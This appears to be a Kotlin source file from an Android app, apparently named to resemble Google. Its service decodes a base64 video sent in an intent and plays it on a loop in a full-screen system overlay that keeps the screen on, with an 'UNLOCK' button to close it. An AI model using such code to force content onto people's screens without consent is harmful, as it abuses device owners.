package com.app.xgoogle

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.VideoView
import java.io.File
import java.io.FileOutputStream

class VideoOverlayService : Service() {
    private var wm: WindowManager? = null
    private var overlay: FrameLayout? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP_VIDEO") {
            removeOverlay()
            stopSelf()
            return START_NOT_STICKY
        }

        val base64 = intent?.getStringExtra("base64")
        if (base64 != null && overlay == null) {
            try {
                val tempFile = File(cacheDir, "temp_video.mp4")
                val decodedBytes = Base64.decode(base64, Base64.DEFAULT)
                FileOutputStream(tempFile).use { it.write(decodedBytes) }
                showOverlay(tempFile)
            } catch (e: Exception) { }
        }
        return START_STICKY
    }

    private fun showOverlay(file: File) {
        try {
            wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            overlay = FrameLayout(this)
            overlay?.setBackgroundColor(Color.BLACK)

            val layout = LinearLayout(this)
            layout.orientation = LinearLayout.VERTICAL
            layout.gravity = Gravity.CENTER
            val lp = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
            layout.layoutParams = lp

            val videoView = VideoView(this)
            val videoLp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f)
            videoView.layoutParams = videoLp
            
            videoView.setVideoPath(file.absolutePath)
            videoView.setOnPreparedListener { it.isLooping = true }
            videoView.start()

            val btnUnlock = Button(this)
            btnUnlock.text = "TUTUP VIDEO (UNLOCK)"
            btnUnlock.setBackgroundColor(Color.RED)
            btnUnlock.setTextColor(Color.WHITE)
            btnUnlock.setOnClickListener { 
                removeOverlay()
                stopSelf()
            }
            val btnLp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 150)
            btnUnlock.layoutParams = btnLp

            layout.addView(videoView)
            layout.addView(btnUnlock)
            overlay?.addView(layout)

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )
            wm?.addView(overlay, params)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removeOverlay() {
        try {
            if (overlay != null && wm != null) {
                wm?.removeView(overlay)
                overlay = null
            }
        } catch (e: Exception) { }
    }

    override fun onDestroy() {
        removeOverlay()
        super.onDestroy()
    }
}
